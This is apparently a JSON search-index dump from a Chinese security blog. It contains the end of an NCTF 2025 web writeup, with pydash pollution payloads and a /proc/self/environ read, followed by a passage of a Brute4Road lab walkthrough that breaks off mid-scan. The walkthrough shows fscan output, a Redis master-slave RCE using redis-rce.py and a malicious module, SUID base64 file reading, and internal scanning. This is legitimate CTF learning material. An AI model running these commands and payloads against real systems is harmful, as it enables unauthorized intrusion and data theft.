return \u0026#34;yes\u0026#34; if setval(name, path, value) else \u0026#34;no\u0026#34; 54 55@bottle.get(\u0026#39;/render\u0026#39;) 56def render_template(): 57 path=bottle.request.query.get(\u0026#39;path\u0026#39;) 58 if len(path)\u0026gt;10: 59 return \u0026#34;hacker\u0026#34; 60 blacklist=[\u0026#34;{\u0026#34;,\u0026#34;}\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;%\u0026#34;,\u0026#34;\u0026lt;\u0026#34;,\u0026#34;\u0026gt;\u0026#34;,\u0026#34;_\u0026#34;] 61 for c in path: 62 if c in blacklist: 63 return \u0026#34;hacker\u0026#34; 64 return bottle.template(path) 65bottle.run(host=\u0026#39;0.0.0.0\u0026#39;, port=8000) rev修复了非预期\n那就是打pydash污染\n首先想着先把__forbidden_name__污染掉\n?name=setval\r{\r\u0026#34;path\u0026#34;:\u0026#34;__globals__.__forbidden_name__\u0026#34;,\r\u0026#34;value\u0026#34;:\u0026#34;\u0026#34;\r} 发现no\n本地调试一下\n可以看到在高版本的pydash中会对path进行检查\n如果path中存在__globals__，__builtins__则会返回异常\n我们需要先把RESTRICTED_KEYS给污染掉\n?name=pydash\r{\r\u0026#34;path\u0026#34;:\u0026#34;helpers.RESTRICTED_KEYS\u0026#34;,\r\u0026#34;value\u0026#34;:\u0026#34;\u0026#34;\r} 现在就可以污染__forbidden_name__了\n污染掉__forbidden_name__之后，我们可以通过对bottle的模板路径进行污染从而实现在render路由进行任意文件读取，因为这题的flag在环境变量中，所以我们直接将TEMPLATE_PATH污染为**/proc/self**\n?name=bottle\r{\r\u0026#34;path\u0026#34;:\u0026#34;TEMPLATE_PATH\u0026#34;,\r\u0026#34;value\u0026#34;:[\u0026#34;/proc/self/\u0026#34;]\r} 接着在/render读环境变量\n?path=environ 拿到flag\n","permalink":"http://localhost:1313/post/nctf_2024/","summary":"\u003ch3 id=\"sqlmap-master\"\u003esqlmap-master\u003c/h3\u003e\n\u003cp\u003e题目\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 1\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kn\"\u003efrom\u003c/span\u003e \u003cspan class=\"nn\"\u003efastapi\u003c/span\u003e \u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"n\"\u003eFastAPI\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eRequest\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 2\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kn\"\u003efrom\u003c/span\u003e \u003cspan class=\"nn\"\u003efastapi.responses\u003c/span\u003e \u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"n\"\u003eFileResponse\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eStreamingResponse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 3\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003esubprocess\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 4\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 5\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003eapp\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eFastAPI\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 6\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 7\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nd\"\u003e@app.get\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;/\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 8\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003easync\u003c/span\u003e \u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003eindex\u003c/span\u003e\u003cspan class=\"p\"\u003e():\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 9\u003c/span\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003eFileResponse\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;index.html\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e10\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e11\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nd\"\u003e@app.post\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;/run\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e12\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003easync\u003c/span\u003e \u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003erun\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003erequest\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"n\"\u003eRequest\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e13\u003c/span\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003edata\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003eawait\u003c/span\u003e \u003cspan class=\"n\"\u003erequest\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ejson\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e14\u003c/span\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003eurl\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003edata\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eget\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;url\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e15\u003c/span\u003e\u003cspan class=\"cl\"\u003e    \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e16\u003c/span\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"ow\"\u003enot\u003c/span\u003e \u003cspan class=\"n\"\u003eurl\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e17\u003c/span\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;error\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;URL is required\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e18\u003c/span\u003e\u003cspan class=\"cl\"\u003e    \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e19\u003c/span\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003ecommand\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"sa\"\u003ef\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;sqlmap -u \u003c/span\u003e\u003cspan class=\"si\"\u003e{\u003c/span\u003e\u003cspan class=\"n\"\u003eurl\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s1\"\u003e --batch --flush-session\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e20\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e21\u003c/span\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003egenerate\u003c/span\u003e\u003cspan class=\"p\"\u003e():\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e22\u003c/span\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"n\"\u003eprocess\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003esubprocess\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ePopen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e23\u003c/span\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"n\"\u003ecommand\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003esplit\u003c/span\u003e\u003cspan class=\"p\"\u003e(),\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e24\u003c/span\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"n\"\u003estdout\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003esubprocess\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ePIPE\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e25\u003c/span\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"n\"\u003estderr\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003esubprocess\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eSTDOUT\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e26\u003c/span\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"n\"\u003eshell\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"kc\"\u003eFalse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e27\u003c/span\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e28\u003c/span\u003e\u003cspan class=\"cl\"\u003e        \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e29\u003c/span\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003ewhile\u003c/span\u003e \u003cspan class=\"kc\"\u003eTrue\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e30\u003c/span\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"n\"\u003eoutput\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eprocess\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003estdout\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ereadline\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e31\u003c/span\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"n\"\u003eoutput\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e \u003cspan class=\"ow\"\u003eand\u003c/span\u003e \u003cspan class=\"n\"\u003eprocess\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003epoll\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"ow\"\u003eis\u003c/span\u003e \u003cspan class=\"ow\"\u003enot\u003c/span\u003e \u003cspan class=\"kc\"\u003eNone\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e32\u003c/span\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"k\"\u003ebreak\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e33\u003c/span\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"n\"\u003eoutput\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e34\u003c/span\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"k\"\u003eyield\u003c/span\u003e \u003cspan class=\"n\"\u003eoutput\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e35\u003c/span\u003e\u003cspan class=\"cl\"\u003e    \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e36\u003c/span\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003eStreamingResponse\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003egenerate\u003c/span\u003e\u003cspan class=\"p\"\u003e(),\u003c/span\u003e \u003cspan class=\"n\"\u003emedia_type\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;text/plain\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e其实就是一个网页端的sqlmap\u003c/p\u003e\n\u003cp\u003e看一下sqlmap的使用文档\u003c/p\u003e","title":"NCTF-2025-Web-Writeup"},{"content":"参考文章\nhttps://bowuchuling.github.io/posts/chunqiuBrute4Road.html\nhttps://h0ny.github.io/posts/Brute4Road-%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83\n文章 - 浅谈约束委派攻击 - 先知社区\nFLAG1 拿到靶机先用fscan扫一扫\n┌──────────────────────────────────────────────┐\r│ ___ _ │\r│ / _ \\ ___ ___ _ __ __ _ ___| | __ │\r│ / /_\\/____/ __|/ __| \u0026#39;__/ _` |/ __| |/ / │\r│ / /_\\\\_____\\__ \\ (__| | | (_| | (__| \u0026lt; │\r│ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ │\r└──────────────────────────────────────────────┘\rFscan Version: 2.0.0\r[2025-03-17 14:12:55] [INFO] 暴力破解线程数: 1\r[2025-03-17 14:12:55] [INFO] 开始信息扫描\r[2025-03-17 14:12:55] [INFO] 最终有效主机数量: 1\r[2025-03-17 14:12:55] [INFO] 开始主机扫描\r[2025-03-17 14:12:55] [INFO] 有效端口数量: 233\r[2025-03-17 14:12:55] [SUCCESS] 端口开放 39.98.114.207:80\r[2025-03-17 14:12:55] [SUCCESS] 端口开放 39.98.114.207:22\r[2025-03-17 14:12:55] [SUCCESS] 端口开放 39.98.114.207:6379\r[2025-03-17 14:12:55] [SUCCESS] 端口开放 39.98.114.207:21\r[2025-03-17 14:12:55] [SUCCESS] 服务识别 39.98.114.207:22 =\u0026gt; [ssh] 版本:7.4 产品:OpenSSH 信息:protocol 2.0 Banner:[SSH-2.0-OpenSSH_7.4.]\r[2025-03-17 14:12:55] [SUCCESS] 服务识别 39.98.114.207:21 =\u0026gt; [ftp] 版本:3.0.2 产品:vsftpd 系统:Unix Banner:[220 (vsFTPd 3.0.2).]\r[2025-03-17 14:13:00] [SUCCESS] 服务识别 39.98.114.207:80 =\u0026gt; [http] 版本:1.20.1 产品:nginx\r[2025-03-17 14:13:00] [SUCCESS] 服务识别 39.98.114.207:6379 =\u0026gt; [redis] 版本:5.0.12 产品:Redis key-value store\r[2025-03-17 14:13:06] [INFO] 存活端口数量: 4\r[2025-03-17 14:13:06] [INFO] 开始漏洞扫描\r[2025-03-17 14:13:06] [INFO] 加载的插件: ftp, redis, ssh, webpoc, webtitle\r[2025-03-17 14:13:06] [SUCCESS] 网站标题 http://39.98.114.207 状态码:200 长度:4833 标题:Welcome to CentOS\r[2025-03-17 14:13:07] [SUCCESS] 匿名登录成功!\r[2025-03-17 14:13:09] [SUCCESS] Redis 39.98.114.207:6379 发现未授权访问 文件位置:/usr/local/redis/db/dump.rdb\r[2025-03-17 14:13:13] [SUCCESS] Redis无密码连接成功: 39.98.114.207:6379\r[2025-03-17 14:13:18] [SUCCESS] 扫描已完成: 5/5 发现redis不需要密码\n那我们连上去\nredis未授权拿shell的常见利用方法有写webshell，写corn或者写sshkey\n这里我先尝试了写corn\n发现没权限\n那同样的也没办法写sshkey\n看到redis版本为5.0.12\n可以打redis主从复制（4.x~5.0.5）\nRedis主从复制getshell技巧 - Bypass - 博客园\n生成恶意so文件\ngit clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand\rcd RedisModules-ExecuteCommand/\rmake 自动化攻击脚本\ngit clone https://github.com/Ridter/redis-rce.git\rcd redis-rce/\rcp ../RedisModules-ExecuteCommand/src/module.so ./\rpip install -r requirements.txt python redis-rce.py -r 192.168.28.152 -p 6379 -L 192.168.28.137 -f module.so\r//python redis-rce.py -r 目标ip-p 目标端口 -L 本地ip -f 恶意.so 拿到shell之后先上个线\n/home/redis/flag/flag01 读flag发现没有权限\n尝试suid提权\n1[redis@centos-web01 tmp]$ find / -perm -u=s -type f 2\u0026gt;/dev/null 2/usr/sbin/pam_timestamp_check 3/usr/sbin/usernetctl 4/usr/sbin/unix_chkpwd 5/usr/bin/at 6/usr/bin/chfn 7/usr/bin/gpasswd 8/usr/bin/passwd 9/usr/bin/chage 10/usr/bin/base64 11/usr/bin/umount 12/usr/bin/su 13/usr/bin/chsh 14/usr/bin/sudo 15/usr/bin/crontab 16/usr/bin/newgrp 17/usr/bin/mount 18/usr/bin/pkexec 19/usr/libexec/dbus-1/dbus-daemon-launch-helper 20/usr/lib/polkit-1/polkit-agent-helper-1 base64可以提权，但是只能读文件\nbase64 \u0026#34;/home/redis/flag/flag01\u0026#34; | base64 --decode [redis@centos-web01 tmp]$ base64 \u0026#34;/home/redis/flag/flag01\u0026#34; | base64 --decode\r██████ ██ ██ ███████ ██\r░█░░░░██ ░██ █░█ ░██░░░░██ ░██\r░█ ░██ ██████ ██ ██ ██████ █████ █ ░█ ░██ ░██ ██████ ██████ ░██\r░██████ ░░██░░█░██ ░██░░░██░ ██░░░██ ██████░███████ ██░░░░██ ░░░░░░██ ██████\r░█░░░░ ██ ░██ ░ ░██ ░██ ░██ ░███████░░░░░█ ░██░░░██ ░██ ░██ ███████ ██░░░██\r░█ ░██ ░██ ░██ ░██ ░██ ░██░░░░ ░█ ░██ ░░██ ░██ ░██ ██░░░░██ ░██ ░██\r░███████ ░███ ░░██████ ░░██ ░░██████ ░█ ░██ ░░██░░██████ ░░████████░░██████\r░░░░░░░ ░░░ ░░░░░░ ░░ ░░░░░░ ░ ░░ ░░ ░░░░░░ ░░░░░░░░ ░░░░░░ flag01: flag{b16a2a4f-87b9-404c-8989-3ac8eac58ae2}\rCongratulations! ! !\rGuess where is the second flag? 拿到第一个flag\nFLAG2 信息收集一下\n看一下ip\n1[redis@centos-web01 tmp]$ ip addr show 21: lo: \u0026lt;LOOPBACK,UP,LOWER_UP\u0026gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 3 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 4 inet 127.0.0.1/8 scope host lo 5 valid_lft forever preferred_lft forever 6 inet6 ::1/128 scope host 7 valid_lft forever preferred_lft forever 82: eth0: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc mq state UP group default qlen 1000 9 link/ether 00:16:3e:1a:f1:ec brd ff:ff:ff:ff:ff:ff 10 inet 172.22.2.7/16 brd 172.22.255.255 scope global dynamic eth0 11 valid_lft 315356573sec preferred_lft 315356573sec 12 inet6 fe80::216:3eff:fe1a:f1ec/64 scope link 13 valid_lft forever preferred_lft forever fscan扫一下\n1[redis@centos-web01 tmp]$ ./fscan -h 172.22.2.7/24 -nobr 2┌──────────────────────────────────────────────┐ 3│ ___ _ │ 4│ / _ \\ ___ ___ _ __ __ _ ___| | __ │ 5│ / /_\\/____/ __|/ __| \u0026#39;__/ _` |/ __| |/ / │ 6│ / /_\\\\_____\\__ \\ (__| | | (_| | (__| \u0026lt; │ 7│ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ │ 8└──────────────────────────────────────────────┘ 9 Fscan Version: 2.0.0 10 11[2025-03-17 20:10:58] [INFO] 暴力破解线程数: 1 12[2025-03-17 20:10:58] [INFO] 开始信息扫描 13[2025-03-17 20:10:58] [INFO] CIDR范围: 172.22.2.0-172.22.2.255 14[2025-03-17 20:10:58] [INFO] 生成IP范围: 172.22.2.0.%!d(string=172.22.2.255) - %!s(MISSING).%!d(MISSING) 15[2025-03-17 20:10:58] [INFO] 解析CIDR 172.22.2.7/24 -\u0026gt; IP范围 172.22.2.0-172.22.2.255 16[2025-03-17 20:10:58] [INFO] 最终有效主机数量: 256 17[2025-03-17 20:10:58] [INFO] 开始主机扫描 18[2025-03-17 20:10:58] [INFO] 正在尝试无监听ICMP探测... 19[2025-03-17 20:10:58] [INFO] 当前用户权限不足,无法发送ICMP包 20[2025-03-17 20:10:58] [INFO] 切换为PING方式探测... 21[2025-03-17 20:10:58] [SUCCESS] 目标 172.22.2.3 存活 (ICMP) 22[2025-03-17 20:10:58] [SUCCESS] 目标 172.22.2.7 存活 (ICMP) 23[2025-03-17 20:10:58] [SUCCESS] 目标 172.22.2.16 存活 (ICMP) 24[2025-03-17 20:10:59] [SUCCESS] 目标 172.22.2.18 存活 (ICMP) 25[2025-03-17 20:10:59] [SUCCESS] 目标 172.22.2.34 存活 (ICMP) 26[2025-03-17 20:11:04] [INFO] 存活主机数量: 5 27[2025-03-17 20:11:05] [INFO] 有效端口数量: 233 28[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.7:80 29[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.18:22 30[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.7:22 31[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.7:21 32[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.3:445 33[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.3:389 34[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.34:139 35[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.18:139 36[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.34:135 37[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.16:139 38[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.3:139 39[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.16:135 40[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.3:135 41[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.34:445 42[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.16:445 43[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.16:80 44[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.18:80 45[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.3:88 46[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.18:445 47[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.16:1433 48[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.7:6379 49[2025-03-17 20:11:05] [SUCCESS] 服务识别 172.22.2.18:22 =\u0026gt; [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.] 50[2025-03-17 20:11:05] [SUCCESS] 服务识别 172.22.2.7:22 =\u0026gt; [ssh] 版本:7.4 产品:OpenSSH 信息:protocol 2.0 Banner:[SSH-2.0-OpenSSH_7.4.] 51[2025-03-17 20:11:05] [SUCCESS] 服务识别 172.22.2.7:21 =\u0026gt; [ftp] 版本:3.0.2 产品:vsftpd 系统:Unix Banner:[220 (vsFTPd 3.0.2).] 52[2025-03-17 20:11:10] [SUCCESS] 服务识别 172.22.2.7:80 =\u0026gt; [http] 版本:1.20.1 产品:nginx 53[2025-03-17 20:11:10] [SUCCESS] 服务识别 172.22.2.3:445 =\u0026gt; 54[2025-03-17 20:11:10] [SUCCESS] 服务识别 172.22.2.3:389 =\u0026gt; [ldap] 产品:Microsoft Windows Active Directory LDAP 系统:Windows 信息:Domain: xiaorang.lab, Site: Default-First-Site-Name 55[2025-03-17 20:11:10] [SUCCESS] 服务识别 172.22.2.34:139 =\u0026gt; Banner:[.] 56[2025-03-17 20:11:10] [SUCCESS] 服务识别 172.22.2.16:139 =\u0026gt; Banner:[.] 57[2025-03-17 20:11:10] [SUCCESS] 服务识别 172.22.2.3:139 =\u0026gt; Banner:[.] 58[2025-03-17 20:11:10] [SUCCESS] 服务识别 172.22.2.34:445 =\u0026gt; 59[2025-03-17 20:11:10] [SUCCESS] 服务识别 172.22.2.16:445 =\u0026gt; 60[2025-03-17 20:11:10] [SUCCESS] 服务识别 172.22.2.16:80 =\u0026gt; [http] 版本:2.0 产品:Microsoft HTTPAPI httpd 系统:Windows 61[2025-03-17 20:11:10] [SUCCESS] 服务识别 172.22.2.3:88 =\u0026gt; 62[2025-03-17 20:11:11] [SUCCESS] 服务识别 172.22.2.16:1433 =\u0026gt; [ms-sql-s] 版本:13.00.4001; SP1 产品:Microsoft SQL Server 2016 系统:Windows Banner:[.%.] 63[2025-03-17 20:11:11] [SUCCESS] 服务识别 172.22.2.7:6379 =\u0026gt; [redis] 版本:5.0.12 产品:Redis key-value store 64[2025-03-17 20:11:11] [SUCCESS] 服务识别 172.22.2.18:80 =\u0026gt; [http] 65[2025-03-17 20:12:05] [SUCCESS] 服务识别 172.22.2.18:139 =\u0026gt; 66[2025-03-17 20:12:06] [SUCCESS] 服务识别 172.22.2.18:445 =\u0026gt; 67[2025-03-17 20:12:10] [SUCCESS] 服务识别 172.22.2.34:135 =\u0026gt; 68[2025-03-17 